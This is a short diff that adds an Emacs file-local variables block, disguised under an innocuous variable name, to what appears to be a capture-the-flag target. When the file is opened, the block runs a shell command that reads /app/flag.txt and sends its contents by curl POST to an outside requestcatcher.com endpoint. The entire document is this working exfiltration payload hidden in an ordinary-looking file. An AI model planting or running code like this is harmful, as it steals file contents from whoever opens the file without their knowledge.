@@ -1,0 +1,3 @@
+# Local Variables:
+# cooking-motivation-generator: (shell-command (concat "curl -X POST -d '" (subst-char-in-string ?' ?@ (with-temp-buffer (insert-file-contents "/app/flag.txt") (buffer-string))) "' https://nyaaa.requestcatcher.com/test"))
+# End:
